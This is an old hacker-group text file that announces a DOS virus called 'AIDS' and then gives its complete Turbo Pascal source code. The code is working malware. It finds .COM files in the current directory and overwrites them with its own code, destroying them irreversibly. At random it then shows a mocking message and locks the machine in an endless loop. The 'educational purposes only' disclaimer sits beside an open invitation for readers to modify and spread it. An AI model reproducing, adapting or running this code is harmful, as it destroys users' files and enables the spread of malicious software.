﻿

 +-------------------------------+     +--------------------------------------+
 |                               |  P  |                                      |
 |  @@@@@@@  @@@@@@@@  @@@@@@@@  |  *  |   #####    #####    ####     #####   |
 |  @@       @@    @@     @@     |  R  |   #   #      #      #   #    #       |
 |  @@       @@    @@     @@     |  *  |   #####      #      #   #    #####   |
 |  @@       @@@@@@@@     @@     |  E  |   #   #      #      #   #        #   |
 |  @@       @@           @@     |  *  |   #   #    #####    ####     #####   |
 |  @@       @@           @@     |  S  |                                      |
 |  @@@@@@@  @@        @@@@@@@@  |  *  +--------------------------------------+
 |                               |  E  |     A NEW AND IMPROVED VIRUS FOR     |
 +-------------------------------+  *  |          PC/MS DOS MACHINES          |
 |       C O R R U P T E D       |  N  +--------------------------------------+
 |                               |  *  |     CREATED BY: DOCTOR DISSECTOR     |
 |     P R O G R A M M I N G     |  T  |FILE INTENDED FOR EDUCATIONAL USE ONLY|
 |                               |  *  |  AUTHOR NOT RESPONSIBLE FOR READERS  |
 |   I N T E R N A T I O N A L   |  S  |DOES NOT ENDORSE ANY ILLEGAL ACTIVITYS|
 +-------------------------------+     +--------------------------------------+

 Well well, here it is... I call it AIDS... It infects all COM files, but it is
 not perfect, so it will also change the date/time stamp to the current system.
 Plus, any READ-ONLY attributes will ward this virus off, it doesn't like them!

 Anyway, this virus was originally named NUMBER ONE, and I modified the code so
 that it would fit my needs. The source code, which is included with this neato
 package was written in Turbo Pascal 3.01a. Yeah I know it's old, but it works.

 Well, I added a few things, you can experiment or mess around with it if you'd
 like to, and add any mods to it that you want, but change the name and give us
 some credit if you do.

 The file is approximately 13k long, and this extra memory will be added to the
 file it picks as host. If no more COM files are to be found, it picks a random
 value from 1-10, and if it happens to be the lucky number 7, AIDS will present
 a nice screen with lots of smiles, with a note telling the operator that their
 system is now screwed, I mean permanantly. The files encrypted containing AIDS
 in their code are IRREVERSIBLY messed up. Oh well...

 Again, neither CPI nor the author of Number One or AIDS endorses this document
 and program for use in any illegal manner. Also, CPI, the author to Number One
 and AIDS is not responsible for any actions by the readers that may prove harm
 in any way or another. This package was written for EDUCATIONAL purposes only!


{C-}
{U-}
{I-}       { Won't allow a user break, enable IO check }

{ -- Constants --------------------------------------- }

Const
     VirusSize = 13847;    { AIDS' code size }

     Warning   :String[42]     { Warning message }
     = 'This File Has Been Infected By AIDS! HaHa!';

{ -- Type declarations------------------------------------- }

Type
     DTARec    =Record      { Data area for file search }
     DOSnext  :Array[1..21] of Byte;
                   Attr    : Byte;
                   Ftime,
                   FDate,
                   FLsize,
                   FHsize  : Integer;
                   FullName: Array[1..13] of Char;
                 End;

Registers    = Record    {Register set used for file search }
   Case Byte of
   1 : (AX,BX,CX,DX,BP,SI,DI,DS,ES,Flags : Integer);
   2 : (AL,AH,BL,BH,CL,CH,DL,DH          : Byte);
   End;

{ -- Variables--------------------------------------------- }

Var
                               { Memory offset program code }
   ProgramStart : Byte absolute Cseg:$100;
                                          { Infected marker }
   MarkInfected : String[42] absolute Cseg:$180;
   Reg          : Registers;                 { Register set }
   DTA          : DTARec;                       { Data area }
   Buffer       : Array[Byte] of Byte;        { Data buffer }
   TestID       : String[42]; { To recognize infected files }
   UsePath      : String[66];        { Path to search files }
                                    { Lenght of search path }
   UsePathLenght: Byte absolute UsePath;
   Go           : File;                    { File to infect }
   B            : Byte;                              { Used }
   LoopVar      : Integer;  {Will loop forever}

{ -- Program code------------------------------------------ }

Begin
  GetDir(0, UsePath);               { get current directory }
  if Pos('\', UsePath) <> UsePathLenght then
    UsePath := UsePath + '\';
  UsePath := UsePath + '*.COM';        { Define search mask }
  Reg.AH := $1A;                            { Set data area }
  Reg.DS := Seg(DTA);
  Reg.DX := Ofs(DTA);
  MsDos(Reg);
  UsePath[Succ(UsePathLenght)]:=#0; { Path must end with #0 }
  Reg.AH := $4E;
  Reg.DS := Seg(UsePath);
  Reg.DX := Ofs(UsePath[1]);
  Reg.CX := $ff;          { Set attribute to find ALL files }
  MsDos(Reg);                   { Find first matching entry }
  IF not Odd(Reg.Flags) Then         { If a file found then }
    Repeat
      UsePath := DTA.FullName;
      B := Pos(#0, UsePath);
      If B > 0 then
      Delete(UsePath, B, 255);             { Remove garbage }
      Assign(Go, UsePath);
      Reset(Go);
      If IOresult = 0 Then          { If not IO error then }
      Begin
        BlockRead(Go, Buffer, 2);
        Move(Buffer[$80], TestID, 43);
                      { Test if file already ill(Infected) }
        If TestID <> Warning Then        { If not then ... }
        Begin
          Seek (Go, 0);
                            { Mark file as infected and .. }
          MarkInfected := Warning;
                                               { Infect it }
          BlockWrite(Go,ProgramStart,Succ(VirusSize shr 7));
          Close(Go);
          Halt;                   {.. and halt the program }
        End;
        Close(Go);
      End;
        { The file has already been infected, search next. }
      Reg.AH := $4F;
      Reg.DS := Seg(DTA);
      Reg.DX := Ofs(DTA);
      MsDos(Reg);
    {  ......................Until no more files are found }
    Until Odd(Reg.Flags);
Loopvar:=Random(10);
If Loopvar=7 then
begin
  Writeln('');                          {Give a lot of smiles}
Writeln('');
Writeln('     ');
Writeln('                                 ATTENTION:                             ');
Writeln('      I have been elected to inform you that throughout your process of ');
Writeln('      collecting and executing files, you have accidentally Hš›Kä     ');
Writeln('      yourself over; again, that''s PHUCKED yourself over. No, it cannot ');
Writeln('      be; YES, it CAN be, a ûç–s has infected your system. Now what do ');
Writeln('      you have to say about that? HAHAHAHA. Have Hš¥ with this one and ');
Writeln('                       remember, there is NO cure for                   ');
Writeln('                                                                        ');
Writeln('         ÛÛÛÛÛÛÛÛÛÛ     ÛÛÛÛÛÛÛÛÛÛÛÛ    ÛÛÛÛÛÛÛÛÛÛÛ      ÛÛÛÛÛÛÛÛÛÛ     ');
Writeln('        ÛÛÛ±±±±±±ÛÛÛ     ±±±±ÛÛ±±±±±±   ÛÛ±±±±±±±ÛÛÛ    ÛÛÛ±±±±±±±ÛÛ    ');
Writeln('        ÛÛ±±      ÛÛ±        ÛÛ±        ÛÛ±       ÛÛ±   ÛÛ±±       ±±   ');
Writeln('        ÛÛ±       ÛÛ±        ÛÛ±        ÛÛ±       ÛÛ±   ÛÛ±             ');
Writeln('        ÛÛÛÛÛÛÛÛÛÛÛÛ±        ÛÛ±        ÛÛ±       ÛÛ±   ÛÛÛÛÛÛÛÛÛÛÛÛ    ');
Writeln('        ÛÛ±±±±±±±±ÛÛ±        ÛÛ±        ÛÛ±       ÛÛ±    ±±±±±±±±±ÛÛ±   ');
Writeln('        ÛÛ±       ÛÛ±        ÛÛ±        ÛÛ±       ÛÛ±             ÛÛ±   ');
Writeln('        ÛÛ±       ÛÛ±        ÛÛ±        ÛÛ±      ÛÛÛ±   ÛÛ       ÛÛÛ±   ');
Writeln('        ÛÛ±       ÛÛ±   ÛÛÛÛÛÛÛÛÛÛÛÛ    ÛÛÛÛÛÛÛÛÛÛÛ±±    ÛÛÛÛÛÛÛÛÛÛ±±   ');
Writeln('         ±±        ±±    ±±±±±±±±±±±±    ±±±±±±±±±±±      ±±±±±±±±±±    ');
Writeln('                                                                        ');
Writeln('     ');
REPEAT
LOOPVAR:=0;
UNTIL LOOPVAR=1;
end;
End.


{ Although this is a primitive virus its effective. }
{ In this virus only the .COM                       }
{ files are infected. Its about 13K and it will     }
{ change the date entry.                            }

